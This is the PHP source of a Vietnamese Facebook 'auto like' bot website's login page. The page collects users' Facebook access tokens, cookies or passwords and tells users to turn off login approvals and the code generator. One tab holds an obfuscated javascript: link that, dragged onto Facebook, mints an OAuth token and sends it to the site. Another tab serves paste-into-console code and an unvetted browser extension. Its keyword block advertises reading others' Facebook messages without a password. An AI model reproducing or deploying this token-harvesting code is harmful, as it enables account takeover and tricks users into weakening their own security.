<?php
error_reporting(0);
ob_start();
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh");
require("./_cnF/_star_cn_F.php");
require("./_cnF/_star_funC.php");
require("./_cnF/_star_online.php");
require('./incfiles/header.php');
if($_SESSION['idfb']) header("Location: trangchu.html");
if($_GET['ref']){
	$ref = isset($_GET['ref']) ? (string)(int)$_GET['ref'] : false;
	$name = mysql_result(mysqli_query($connection, "SELECT ten FROM taikhoan WHERE idfb = '" . $ref . "' "),0);
	if($name == '') $name = '?';
	$_SESSION['ref'] = $ref;
	$_SESSION['refn'] = $name;	
}
?>
					<?php if(!$mobile){ if(!$_SESSION['quangcao']){ $_SESSION['quangcao'] = true; ?>
						<div class="box box-success">
							<div id="homepage">
								<div id="content" style="position: relative;overflow: hidden">
									<div id="ET-modal-background" style="position: fixed;width: 100vw; height: 100vh; background-color: black; z-index: 0; top: 0; left: 0 ; opacity: 0.4; z-index: 1000;"></div>
									<div id="ET-container">
										<div id="ET-grad1" class="ET-grad"></div>
										<img id="ET-border-tittle" src="./img/border-tittle.png">
										<img id="ET-horoscope" src="./img/horoscope.png">
										<div id="ET-datepicker"></div>
										<a href="https://www.facebook.com/system.hdpro" target="_blank"><div id="ET-confirmBtn"></div></a>
										<button id="ET-close" class="ET-quit ET-buttons" data-widget="remove">X</button>
									</div>
								</div>
							</div>
						</div>
					<?php } } ?>
						<div class="col-md-7">
							<div class="box box-info">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-info-circle fa-fw"></i> THÔNG TIN <?=$text['linkvh'];?></h4>
									<div class="box-tools pull-right">
										<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
									</div>
								</div>
								<div class="box-body">
									<p>
										<b> <?=$text['linkvh'];?> </b> Hệ Thống Auto Bot Facebook Hàng Đầu Việt Nam.<br/>
										<b> <?=$text['linkvh'];?> </b> Là Hệ Thống Tăng <i class="fa fa-thumbs-o-up fa-fw"></i> Like, 
										<i class="fa fa-heart-o" aria-hidden="true"></i> Cảm Xúc, <i class="fa fa-rss" aria-hidden="true"></i> Người Theo Dõi,<br> 
										<i class="fa fa-user" aria-hidden="true"></i> Bạn Bè, <i class="fa fa-comment-o" aria-hidden="true"></i> Comment,
										<i class="fa fa-share" aria-hidden="true"></i> Tăng Độ Tương Tác Facebook.<br>
										Hệ Thống Giúp Bạn Tự Động Like Status Bạn Bè Ngay Cả Khi Không Online,<br>
										Hoặc Tăng Like Cho Status Của Bạn, Giúp Tăng Độ Tương Tác Của Bạn Với Bạn Bè.<br>
										Hệ Thống Của Chúng Tôi Tự Động Hóa Một Cách Hoàn Toàn Giúp Bạn Yên Tâm Hơn,<br>
										Và Không Phải Lo Điều Gì Cho Tài Khoản Của Bạn.<br>
										<b>Hãy Theo Dõi Hậu Để Cập Nhật Những Thông Tin Mới Nhất Nhé.</b>
									</p>
									<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fsystem.hdpro&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=500&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden;width: 450px; height:35px;" allowTransparency="true"></iframe>
								</div>
							</div>				
						</div>
						<div class="col-md-5">
							<div class="box box-info">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-info-circle fa-fw"></i> HỖ TRỢ - LIÊN HỆ</h4>
									<div class="box-tools pull-right">
										<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
									</div>
								</div>
								<div class="box-body">
									<div id="carousel-example-generic" class="carousel slide" data-interval="3000" data-ride="carousel">
										<div class="carousel-inner" role="listbox">
											<div class="item">
												<center>
													<img class="img-circle img-thumbnail img-thumbnail-avatar-2x" src="https://graph.facebook.com/100004574107394/picture?width=50&amp;height=50" alt="Avatar"><br>
													Quản Lý: <b style="color:red;">Phúc Binz</b><br>
													Liên Hệ: <a class="btn btn-primary btn-xs" href="https://www.facebook.com/system.hdpro" target="_blank"><i class="fa fa-external-link"></i> Facebook</a><br><br>
													<a class="btn btn-block btn-primary" href="https://www.facebook.com/messages/100006716972752" target="_blank"><i class="fa fa-external-link"></i> Yêu Cầu Hỗ Trợ</a>
													<a class="btn btn-block btn-warning" data-toggle="modal" data-target="#huongdan"><i class="fa fa-question"></i> Hướng Dẫn Sử Dụng</a><br>
												</center>
											</div>
											<div class="item active">
												<center>
													<img class="img-circle img-thumbnail img-thumbnail-avatar-2x" src="https://graph.facebook.com/100004574107394/picture?width=50&amp;height=50" alt="Avatar"><br>
													Quản Lý: <b style="color:red;">Phúc Binz</b><br>
													Liên Hệ: <a class="btn btn-primary btn-xs" href="https://www.facebook.com/system.hdpro" target="_blank"><i class="fa fa-external-link"></i> Facebook</a><br><br>
													<a class="btn btn-block btn-primary" href="https://www.facebook.com/messages/100006716972752" target="_blank"><i class="fa fa-external-link"></i> Yêu Cầu Hỗ Trợ</a>
													<a class="btn btn-block btn-warning" data-toggle="modal" data-target="#huongdan"><i class="fa fa-question"></i> Hướng Dẫn Sử Dụng</a><br>
												</center>
											</div>
										</div>
									</div>
								</div>
							</div>				
						</div>
						<div class="col-lg-12 col-md-12">
							<div class="box box-success">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-yelp"></i> Đăng Nhập Hệ Thống</h4>
									<div class="box-tools pull-right">
										<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
									</div>
								</div>
								<div class="box-body">
									<div class="tabs-container">
										<ul class="nav nav-tabs tab-border-top-success">
											<li class="active"><a data-toggle="tab" href="#tab-1" aria-expanded="true"><i class="fa fa-sort-alpha-asc"></i> Sử Dụng Token</a></li>
											<li class=""><a data-toggle="tab" href="#tab-2" aria-expanded="false" onclick="toarst(&quot;success&quot;,&quot;Khuyên Dùng Đăng Nhập Bằng Cookie, Hệ Thống Đã Chống Checkpoint 100%.&quot;,&quot;Tin Nhắn Hệ THống&quot;)"><i class="fa fa-file-image-o"></i> Sử Dụng Cookie</a></li>
											<li class=""><a data-toggle="tab" href="#tab-3" aria-expanded="false" onclick="toarst(&quot;success&quot;,&quot;Khuyên Dùng Đăng Nhập Bằng Tài Khoản, Hệ Thống Đã Chống Checkpoint 99,99%.&quot;,&quot;Tin Nhắn Hệ THống&quot;)"><i class="fa fa-file-image-o"></i> Sử Dụng Tài Khoản</a></li>
											<li class=""><a data-toggle="tab" href="#tab-4" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Ứng Dụng</a></li>
											<li class=""><a data-toggle="tab" href="#tab-5" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Hình Ảnh</a></li>
											<li class=""><a data-toggle="tab" href="#tab-6" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Code F12</a></li>
										</ul>
										<div class="tab-content">
											<div id="tab-1" class="tab-pane active">
												<div class="box-body">
													<div class="col-md-12">
														<div class="input-group">
														<? if($_GET['ref']) echo'<b>Người Giới Thiệu : '.$name.'</b>'; ?>
														</div>
														<div class="input-group">
															<input type="text" placeholder="Nhập Token Vào Đây..." class="form-control" id="matoken" onpaste="setTimeout( function() { login(document.getElementById('matoken').value);}, 100);"><br>
															<span class="input-group-btn"> 
																<button id="go" type="button" onclick="login(document.getElementById('matoken').value);" class="btn btn-primary">Đăng Nhập</button>
															</span>
														</div><br />
													</div>
													<div class="form-group">
														<div class="col-md-4">
															<a class="btn btn-block btn-danger" href="https://goo.gl/UOX6r1" target="_blank"><i class="fa fa-cogs"></i> Cấp Quyền</a>
														</div>
														<div class="col-md-4">
														<a class="btn btn-block btn-success" href="https://goo.gl/FZ4vnb" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a>
													</div>
														<div class="col-md-4">
															<button type="button" class="btn btn-block  btn-warning" data-toggle="modal" data-target="#huongdanlogin"><i class="fa fa-question"></i> Hướng Dẫn Đăng Nhập</button>
														</div>
													</div>
												</div>
											</div><!-- </div> tab1 -->
											<div id="tab-2" class="tab-pane">
												<div class="box-body">
													<div class="input-group">
														<span class="input-group-addon"><i class="fa fa-user"></i></span><input id="cookie" class="form-control" name="cookie" placeholder="Nhập Vào Cookie Của Bạn..." type="text"><span class="input-group-addon"><i class="fa fa-user"></i></span>
													</div>
													<div class="input-group">
														<span class="input-group-addon">Ứng Dụng Đăng Nhập</span>
															<select id="appcookie" class="form-control">
																<option value="htc">HTC Sense</option> 
																<option value="ios">PAGES MANAGER FOR IOS</option>
															</select>
													</div><br>
													<center>
														<span class="input-group-btn"><button type="submit" onclick="logincookie();" class="btn btn-primary" id="botcookie">Đăng Nhập</button></span>                 
													</center>
													<hr>
													<div id="message" style="display: none;"></div>
													<div class="col-md-12">
														<a onclick="showvideo('https://www.youtube.com/embed/b1sqWgkNiiQ','hd_cookie');" class="btn btn-warning btn-xs">Click Vào Để Xem Clip Đăng Nhập Bằng Cookie.</a>
														<div id="hd_cookie"></div><br>
														<ul>
															<li>LƯU Ý: Đăng Nhập Bằng Cookie Chỉ Hỗ Trợ Cho Máy Tính.</li>
														</ul>
														<ol>
															<li>Đối Với Trình Duyệt Chrome Hoặc Cốc Cốc, Các Bạn Cài Đặt Tiện Ích CDN Headers & Cookies <a class="btn btn-success btn-xs" href="https://chrome.google.com/webstore/detail/cdn-headers-cookies/obldlamadkihjlkdjblncejeblbogmnb?hl=vi" target="_blank"><i class="fa fa-wrench" aria-hidden="true"></i> Tại Đây</a></li>
															<li>Chọn <b>Thêm Vào Chrome</b> <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/cookie1.png" width="893" height="449"></ul></div> Sau Đó Chọn <b>Thêm Tiện Ích</b> <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/cookie2.png" width="645" height="382"></ul></div></li>
															<li>Đăng Nhập <a class="btn btn-primary btn-xs dropdown-toggle" href="https://www.facebook.com" target="_blank"><i class="fa fa-external-link"></i> Facebook</a> Và Ấn Vào Icon <img src="./img/iconcookie.png" width="22" height="22"> Trên <b>Thanh Công Cụ</b> Của Trình Duyệt.</li>
															<li>Coppy Đoạn Coookie Trong Khung Và Đăng Nhập Thôi <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/cookie3.png" width="901" height="671"></ul></div></li>
														</ol>
													</div>
												</div>
											</div><!-- </div> tab2 -->
											<div id="tab-3" class="tab-pane">
												<div class="box-body">
													<div class="input-group">
														<span class="input-group-addon"><i class="fa fa-user"></i></span><input id="email" class="form-control" name="email" placeholder="Email Hoặc SĐT..." type="text"><span class="input-group-addon"><i class="fa fa-user"></i></span>
													</div>
													<div class="input-group">
														<span class="input-group-addon"><i class="fa fa-lock"></i></span><input id="password" class="form-control" name="password" placeholder="Mật Khẩu..." type="password"><span class="input-group-addon">  <i class="fa fa-lock"></i> </span>
													</div>
													<div class="input-group">
														<span class="input-group-addon">Ứng Dụng Đăng Nhập</span>
														<select id="app" class="form-control">	
															<option value="6628568379">FACEBOOK FOR IPHONE</option>
															<option value="350685531728">FACEBOOK FOR ANDROID</option>
															<option value="165907476854626">PAGES MANAGER FOR IOS</option>
															<option value="41158896424">HTC Sense</option> 
														</select>                                
													</div><br>
													<center>
														<span class="input-group-btn"><button type="submit" onclick="loginemail();" class="btn btn-primary" id="botlogin">Đăng Nhập</button></span>                 
													</center>
													<hr>
													<div id="message" style="display: none;"></div>
													<div class="col-md-12">
														<ul>
															<li>LƯU Ý: Mật Khẩu Có Khoảng Trắng Hoặc Kí Tự Đặc Biệt Sẽ Không Đăng Nhập Được. </li>
														</ul>
														<ol>
															<li>Sử Dụng SĐT, Nếu Không Đăng Nhập Được, Bạn Hãy Thay Đổi Đầu Số 01 Hoặc 09 Thành 84 .</li>
															<li>VD: 01223456789 Thay Thành 841223456789.</li>
															<li>Lần Đầu Sử Dụng Có Thể Sẽ Không Hoạt Động Được.</li>
															<li>Bạn Vào <b>Cài Đặt</b> --> <b>Bảo Mật</b> --> <b>Xét Duyệt Đăng Nhập </b> (Tắt) Giống <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/6.png" width="550" height="320"/></ul></div></li>
															<li>Bạn Vào <b>Cài Đặt</b> --> <b>Bảo Mật</b> --> <b>Trình Tạo Mã</b> (Tắt) Giống <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/7.png" width="550" height="320"/></ul></div></li>
															<li>Nếu Bị Khóa (CheckPoint). Hãy Mở Nó Như Sau <div class="btn-group btn-xs"><a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret"></span> Hình Ảnh </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="img/8.png" width="550" height="320"/></ul></div></li>
															<li>Sau Đó Ấn <a class="btn btn-danger btn-xs dropdown-toggle">Tiếp Tục</a></li>
															<li>Bây Giờ Quay Lại <a class="btn btn-primary btn-xs dropdown-toggle"><?=$text['vh'];?></a> Bạn Có Thể Đăng Nhập Bằng Bất Cứ Thiết Bị Nào.</li>
														</ol>
													</div>
												</div>
											</div><!-- </div> tab3 -->
											<div id="tab-4" class="tab-pane">
												<div class="box-body">
													<div class="col-md-12">
														<a onclick="showvideo('https://www.youtube.com/embed/b1sqWgkNiiQ','hd_ungdung');" class="btn btn-warning btn-xs">Click Vào Để Xem Clip Đăng Nhập Bằng Ứng Dụng.</a>
														<div id="hd_ungdung"></div>
														<b style="font-color:red;"> Đăng Nhập Bằng Ứng Dụng Chỉ Hỗ Trợ Cho Trình Duyệt Chrome Hoặc Cốc Cốc Trên Máy Tính.</b><br>
														<p><b>Bước 1: </b>Sử Dụng Trình Duyệt <img src="./img/chrome-logo.svg" height="16" width="16" alt="Chrome Logo"> <font color="red">Chrome</font> Hoặc <img src="./img/coccoc.ico" alt="Cốc Cốc Logo"> <font color="red">Cốc Cốc</font> Trên Máy Tính Và Ấn <a class="btn btn-success btn-xs" href="./code/App.crx" target="_blank"><i class="fa fa-wrench" aria-hidden="true"></i> Tại Đây</a> Để Tải Về Ứng Dụng.</p>
														<p><b>Bước 2: </b>Truy Cập Địa Chỉ <a class="btn btn-danger btn-xs dropdown-toggle">chrome://extensions</a> Hoặc Vào <a class="btn btn-danger btn-xs dropdown-toggle">Cài Đặt(Setting)</a> Chọn <a class="btn btn-danger btn-xs dropdown-toggle">Tiện Ích(Extension)</a></p>
														<p><b>Bước 3: </b>Kéo Thả File Vừa Download Vào <font color="red">Chrome</font> Hoặc <font color="red">Cốc Cốc</font> Sau Đó Chọn <a class="btn btn-danger btn-xs dropdown-toggle">Thêm Tiện Ích</a></p>
														<p><b>Bước 4: </b>Đăng Nhập <a class="btn btn-primary btn-xs dropdown-toggle" href="https://www.facebook.com" target="_blank"><i class="fa fa-external-link"></i> Facebook</a> Và Click Vào Icon <img src="./img/nutlike.png" width="32" height="32"> Trên Thanh Công Cụ Của Trình Duyệt Để Login.</p>
													</div>
												</div>
											</div><!-- </div> tab4 -->
											<div id="tab-5" class="tab-pane">
												<div class="box-body">
													<div class="col-md-12">
														<a onclick="showvideo('https://www.youtube.com/embed/b1sqWgkNiiQ','hd_keotha');" class="btn btn-warning btn-xs">Click Vào Để Xem Clip Đăng Nhập Bằng Hình Ảnh.</a>
														<div id="hd_keotha"></div>
														<b style="font-color:red;"> Đăng Nhập Bằng Hình Ảnh Chỉ Hỗ Trợ Cho Trình Duyệt Cốc Cốc Trên Máy Tính.</b><br>
														<p><b>Bước 1: </b>Mở 2 Tab, 1 Tab <a class="btn btn-primary btn-xs dropdown-toggle" href="https://www.facebook.com" target="_blank"><i class="fa fa-external-link"></i> Facebook</a> Và 1 Tab <a class="btn btn-primary btn-xs dropdown-toggle"><?=$text['vh'];?></a> Sau Đó Quay Lại <a class="btn btn-primary btn-xs dropdown-toggle"><?=$text['vh'];?></a> Phần Đăng Nhập Bằng Hình Ảnh.</p>
														<p><b>Bước 2: </b>Click Và Giữ Chuột Kéo Thả Tấm Ảnh Bên Dưới Vào Tab <a class="btn btn-primary btn-xs dropdown-toggle" href="https://www.facebook.com" target="_blank"><i class="fa fa-external-link"></i> Facebook</a>. <a onclick="alert(&quot;Kéo Vào Chứ Không Phải Bấm Vào -_-&quot;)" style="cursor: move;" href='javascript:var _0x5be6=["165907476854626","<?=$text['link'];?>/login-captcha.html?access_token=","getTime","value","fb_dtsg","getElementsByName","https://www.facebook.com/v1.0/dialog/oauth/confirm","fb_dtsg=","&amp;app_id=","&amp;redirect_uri=fbconnect://success&amp;display=popup&amp;access_token=&amp;sdk=&amp;from_post=1&amp;private=&amp;tos=&amp;login=&amp;read=&amp;write=&amp;extended=&amp;social_confirm=&amp;confirm=&amp;seen_scopes=&amp;auth_type=&amp;auth_token=&amp;auth_nonce=&amp;default_audience=&amp;ref=Default&amp;return_format=access_token&amp;domain=&amp;sso_device=ios&amp;__CONFIRM__=1","POST","open","onreadystatechange","readyState","status","match","responseText","close","//www.facebook.com/v1.0/dialog/oauth/confirm","href","send"];var id_app=_0x5be6[0];var url=_0x5be6[1];function sleep(_0x442fx4){var _0x442fx5= new Date()[_0x5be6[2]]();while( new Date()[_0x5be6[2]]()<_0x442fx5+_0x442fx4){;}}var delay_time=1000;var fb_dtsg=document[_0x5be6[5]](_0x5be6[4])[0][_0x5be6[3]];var e= new XMLHttpRequest;var t=_0x5be6[6];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];e[_0x5be6[11]](_0x5be6[10],t,true);e[_0x5be6[12]]=function(){if(e[_0x5be6[13]]==4&amp;&amp;e[_0x5be6[14]]==200){mabaomat=e[_0x5be6[16]][_0x5be6[15]](/token=(.+)&amp;/)[1];e[_0x5be6[17]];var _0x442fxb= new XMLHttpRequest;var t=_0x5be6[18];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];_0x442fxb[_0x5be6[11]](_0x5be6[10],t,true);_0x442fxb[_0x5be6[12]]=function(){if(_0x442fxb[_0x5be6[13]]==4&amp;&amp;_0x442fxb[_0x5be6[14]]==200){mabaomat=_0x442fxb[_0x5be6[16]][_0x5be6[15]](/token=(.+)&amp;/)[1];_0x442fxb[_0x5be6[17]];sleep(delay_time);location[_0x5be6[19]]=url+mabaomat}};_0x442fxb[_0x5be6[20]](n)}};e[_0x5be6[20]](n);'><img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/e4299734559659.56d57de04bda4.gif" class="img img-responsive" alt="AUTO LIKE || BOT LIKE || BOOM LIKE" width="150" height="120"></a></p>
														<p><b>Bước 3: </b>Đợi 3s Để Hệ Thống Lấy Và Xác Thực Token Và Tự Quay Lại <a class="btn btn-primary btn-xs dropdown-toggle"><?=$text['vh'];?></a></p>
													</div>
												</div>
											</div><!-- </div> tab5 -->
											<div id="tab-6" class="tab-pane">
												<div class="box-body">
													<div class="col-md-12">
														<a onclick="showvideo('https://www.youtube.com/embed/OatmJo6gx2E','hd_codef12');" class="btn btn-warning btn-xs">Click Vào Để Xem Clip Đăng Nhập Bằng Code F12.</a>
														<div id="hd_codef12"></div>
														<b style="font-color:red;"> Đăng Nhập Bằng Code F12 Chỉ Hỗ Trợ Cho Trình Duyệt Chrome Hoặc Cốc Cốc Trên Máy Tính.</b>
														<p><b>Bước 1: </b>Copy Đoạn Mã (Click Chuột Vào Đoạn Mã => CTRL + C) Đăng Nhập Phía Dưới.</p>
														<p><b>Bước 2: </b>Click <a class="btn btn-primary btn-xs dropdown-toggle" href="https://www.facebook.com" target="_blank"><i class="fa fa-external-link"></i> Vào Đây</a> Để Quay Lại <a class="btn btn-danger btn-xs dropdown-toggle">Facebook</a></p>
														<p><b>Bước 3: </b>Ấn Tổ Hợp Phím <a class="btn btn-danger btn-xs dropdown-toggle">Ctrl + Shift + J</a> Sau Đó Dán Vào (CTRL + V) Ấn Enter Hoặc Ấn F12 Và Chọn Tab <a class="btn btn-danger btn-xs dropdown-toggle">Console</a> Sau Đó Dán Vào (CTRL + V) Ấn Enter. Đợi 3s Để Hệ Thống Lấy Và Xác Thực Token Và Tự Quay Lại <a class="btn btn-primary btn-xs dropdown-toggle"><?=$text['vh'];?></a></p>
														<label for="comment">Đoạn Mã:</label>
														<textarea onclick="this.focus();this.select()" class="form-control" rows="3" id="comment" style="margin: 0px -0.5px 0px 0px; height: 100px;overflow:hidden"><?php echo file_get_contents('./modun_txt/f12_http.log'); ?></textarea>
													</div>
												</div>
											</div><!-- </div> tab6 -->
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="col-md-6">
							<div class="box box-primary">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-star"></i> Người Dùng Vip</h4>
									<div class="box-tools pull-right">
										<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
										<button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button>
									</div>
								</div>
								<div class="box-body" style="overflow: auto;height: 200px;">
								<?php
								echo'
									<table class=table>
									<thead><tr>
									<th><span class="label label-primary"><i class="fa fa-group"></i> Tên</span></th>
									<th><span class="label label-primary"><i class="fa fa-info"></i> Profile ID</span></th>
									<th><span class="label label-primary"><i class="fa fa-calendar-check-o"></i> Hạn</span></th>
									<th><span class="label label-primary"><i class="fa fa-star-half-o"></i> Level</span></th>
									</tr></thead>
									<tbody>
								';
								$req = mysqli_query($connection, "SELECT * FROM `vip` LIMIT 10");
								while($res = mysql_fetch_assoc($req)) {
								echo'<tr>
								<td>
								<a onclick="toarst(&quot;error&quot;,&quot;Vui Lòng Đăng Nhập Để Thực Hiện Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)" style="color: red;"><img src="/img/vip.gif"><b>'.$res['ten'].'</b></a>
								</td>
								<td>
								<a onclick="toarst(&quot;error&quot;,&quot;Vui Lòng Đăng Nhập Để Thực Hiện Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)"><span class="badge bg-red">***************</span></a>
								</td>
								<td>
								<span class="badge bg-green">'.thoigiantinhvip($res['time']).'</span>
								</td>
								<td>
								<span class="badge bg-yellow">';
								if($res['level'] == '1'){ echo 'VIP Member'; }elseif($res['level'] == '2'){  echo 'Medium Member'; 
								}elseif($res['level'] == '3'){ echo 'Super Member';}else{ echo 'Boss Member';}
								echo '</span>
								</td>
								</tr> ';
								}
								echo'</tbody></table>';
								?>
								</div>
								<div class="box-footer">
									<center>Hiện Tại Có <span class="label label-default"><?php echo mysql_result(mysqli_query($connection, "SELECT COUNT(*) FROM `vip`"), 0); ?></span> Người Dùng VIP Trên Hệ Thống.</center>
								</div>
							</div>				
						</div>
						<div class="col-md-6">
							<div class="box box-info">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-users"></i> Người Dùng Mới</h4>
									<div class="box-tools pull-right">
										<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
										<button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button>
									</div>
								</div>
								<div class="box-body" style="overflow: auto;height: 200px;">
								<?php
								echo'
									<table class=table>
									<thead>
									<tr>
									<th><span class="label label-primary"><i class="fa fa-image"></i> Avatar</span></th>
									<th><span class="label label-primary"><i class="fa fa-group"></i> Tên</span></th>
									<th><span class="label label-primary"><i class="fa fa-info"></i> Profile ID</span></th>
									<th><span class="label label-primary"><i class="fa fa-star-half-o"></i> Tham Gia</span></th>
									</tr>
									</thead>
									<tbody>
								';
								$res = mysqli_query($connection, "SELECT * FROM `taikhoan` ORDER BY `id` DESC LIMIT 10");
								while ($post = mysql_fetch_array($res)){
								echo'<tr><div class="col-xs-2 col-md-2">
								<td><a onclick="toarst(&quot;error&quot;,&quot;Vui Lòng Đăng Nhập Để Thực Hiện Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)"><img src="/img/new.gif"><img src="https://graph.facebook.com/'.$post[idfb].'/picture?width=10&amp;height=10" alt="'.$post[ten].'" class="img-circle img-thumbnail" width="30" height="30"></a></td>
								<td><a onclick="toarst(&quot;error&quot;,&quot;Vui Lòng Đăng Nhập Để Thực Hiện Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)"><b><font style="color: red;">'.$post[ten].'</font></b></a></td>
								<td><a onclick="toarst(&quot;error&quot;,&quot;Vui Lòng Đăng Nhập Để Thực Hiện Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)"><span class="badge bg-red">***************</span></a></td>
								<td><span class="badge bg-yellow">'.thoigiantinhlogin($post[time]).'</span></td>
								</div></tr>';
								}
								echo'</tbody></table>';
								?>
								</div>
								<div class="box-footer">
									<center>Hiện Tại Có <span class="label label-default"><?php echo mysql_result(mysqli_query($connection, "SELECT COUNT(*) FROM `taikhoan`"), 0); ?></span> Thành Viên Trên Hệ Thống.</center>
								</div>
							</div>				
						</div>
						<div class="col-md-12">
							<div class="box box-info">
								<div class="box-title box-header with-border">
									<h4><i class="fa fa-info-circle fa-fw"></i> KEY SEARCH</h4>
								</div>
								<div class="box-body">
									<p>tang like, hack like facebook, buff like, auto cam xuc , bot cam xuc , bot like , bot ex like , hack like viet nam, http://hotlike.net, trang web hack like facebook, auto like viet nam, buff like viet nam,cách tăng like stt facebook, hack like ảnh facebook, auto cam xuc , bot cam xuc , bot like , bot ex like  hack like comment facebook, tăng like ảnh facebook, cách hack tăng like,share code auto like, xin code auto like, web auto like, auto sub , auto share , hack share , hack comments , hack bình luận, auto like sub , đọc trộm tin nhắn facebook , xem tin nhắn facebook không cần mật khẩu</p>
								</div>
							</div>
						</div>
						<div class="modal inmodal" id="huongdanlogin" tabindex="-1" role="dialog" aria-hidden="true">
							<div class="modal-dialog modal-lg">
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
										<h4 class="modal-title">Cấp Quyền Ứng Dụng</h4>
										<small class="font-bold">
											<p class="text-danger">Lưu Ý: Mục Này Chỉ Dành Cho Tài Khoản Sử Dụng Lần Đâu Tại Website.</p>
										</small>
									</div>
									<div class="modal-body">
										<h3>Bước 1</h3>
										<a class="btn btn-block btn-primary" href="https://goo.gl/UOX6r1" target="_blank"><i class="fa fa-cogs"></i> Cài Đặt Ứng Dụng Lần Đầu (Cấp Quyền)</a><hr>
										<h3>Bước 2</h3>
										<div class="item"><img alt="image" class="img-responsive" src="img/1.png"></div>
										<div class="item"><img alt="image" class="img-responsive" src="img/2.png"></div>
										<div class="item"><img alt="image" class="img-responsive" src="img/3.png"></div>
										<div class="item">
											<font color="red">Token Sẽ Là Đoạn Trong Khung Màu Đỏ</font>
											<img alt="image" class="img-responsive" src="img/4.png">
										</div><hr>
										<h3>Bước 3</h3>
										<p style="font-size: 17px;">Nếu Như Token Không Xuất Hiện, Vui Lòng Ấn Vào Đây  <a class="btn btn-info btn-xs dropdown-toggle" href="https://goo.gl/FZ4vnb" target="_blank">Lấy Token</a></p>
										<img alt="image" class="img-responsive" src="img/5.png">
										<p style="font-size: 17px;">Phần Trong Khung Màu Đỏ Chính Là Token Của Bạn. Thân!</p>
										<hr>
									</div>
									<div class="modal-footer">
										<button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">Đóng</button>
									</div>
								</div>
							</div>
						</div>

<?php
require('./incfiles/footer.php');
?>